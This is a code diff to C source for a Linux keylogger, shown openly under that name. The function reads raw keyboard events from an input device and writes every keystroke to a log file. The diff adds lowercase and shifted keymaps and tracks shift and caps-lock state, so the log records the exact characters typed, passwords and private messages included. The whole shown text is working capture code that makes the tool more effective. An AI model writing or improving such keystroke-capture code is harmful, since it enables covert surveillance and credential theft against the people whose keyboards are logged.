@@ -268,15 +268,28 @@ void startKeylogger(const char* logfile) {
     time_t t;
     struct tm* tm_info;
 
-    // keymap
-    const char* keymap[] = {
+    // Define keymaps
+    const char* keymap_lower[] = {
         "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
-        "-", "=", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
-        "O", "P", "[", "]", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H",
-        "J", "K", "L", ";", "'", "`", "LEFTSHIFT", "\\", "Z", "X", "C", "V",
-        "B", "N", "M", ",", ".", "/", "RIGHTSHIFT", "KP*",
-        "LEFTALT", "SPACE", "CAPSLOCK", 
+        "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
+        "o", "p", "[", "]", "ENTER", "LEFTCTRL", "a", "s", "d", "f", "g", "h",
+        "j", "k", "l", ";", "'", "`", "LEFTSHIFT", "\\", "z", "x", "c", "v",
+        "b", "n", "m", ",", ".", "/", "RIGHTSHIFT", "KP*",
+        "LEFTALT", "SPACE", "CAPSLOCK", /* Add more keys as needed */
     };
+
+    const char* keymap_upper[] = {
+        "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
+        "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
+        "O", "P", "{", "}", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H",
+        "J", "K", "L", ":", "\"", "~", "LEFTSHIFT", "|", "Z", "X", "C", "V",
+        "B", "N", "M", "<", ">", "?", "RIGHTSHIFT", "KP*",
+        "LEFTALT", "SPACE", "CAPSLOCK", /* Add more keys as needed */
+    };
+
+    // Track modifier states
+    int shift_pressed = 0;
+    int caps_lock = 0;
 
     // Open the input device for reading
     fd = open(DEVICE_PATH, O_RDONLY);
@@ -308,15 +321,33 @@ void startKeylogger(const char* logfile) {
         // Read input events
         ssize_t bytesRead = read(fd, &ev, sizeof(ev));
         if (bytesRead == sizeof(ev)) {
-            if (ev.type == EV_KEY && ev.value == 1) { 
-                if (ev.code < sizeof(keymap) / sizeof(keymap[0])) {
-                    char keyInfo[64];
-                    snprintf(keyInfo, sizeof(keyInfo), "Key %s pressed\n", keymap[ev.code]);
-                    write(logfd, keyInfo, strlen(keyInfo));
-                } else {
-                    char unknownKey[64];
-                    snprintf(unknownKey, sizeof(unknownKey), "Unknown key %d pressed\n", ev.code);
-                    write(logfd, unknownKey, strlen(unknownKey));
+            if (ev.type == EV_KEY) {
+                // Track modifier key states
+                if (ev.code == 42 || ev.code == 54) { // LeftShift or RightShift
+                    shift_pressed = ev.value;
+                } else if (ev.code == 58 && ev.value == 1) { // CapsLock toggles on key press
+                    caps_lock = !caps_lock;
+                }
+
+                // Handle keypress events
+                if (ev.value == 1) { // Key press
+                    const char* key = NULL;
+                    if (ev.code < sizeof(keymap_lower) / sizeof(keymap_lower[0])) {
+                        // Determine whether to use lower or upper keymap
+                        int use_upper = shift_pressed ^ caps_lock;
+                        key = use_upper ? keymap_upper[ev.code] : keymap_lower[ev.code];
+                    }
+
+                    // Log the key if it exists in the keymap
+                    if (key) {
+                        char keyInfo[64];
+                        snprintf(keyInfo, sizeof(keyInfo), "%s", key);
+                        write(logfd, keyInfo, strlen(keyInfo));
+                    } else {
+                        char unknownKey[64];
+                        snprintf(unknownKey, sizeof(unknownKey), "Unknown key %d\n", ev.code);
+                        write(logfd, unknownKey, strlen(unknownKey));
+                    }
                 }
             }
         }
@@ -327,6 +358,7 @@ void startKeylogger(const char* logfile) {
     close(logfd);
     printf("Keylogger stopped.\n");
 }
+
 
 
 void sigint_handler(int sig) {
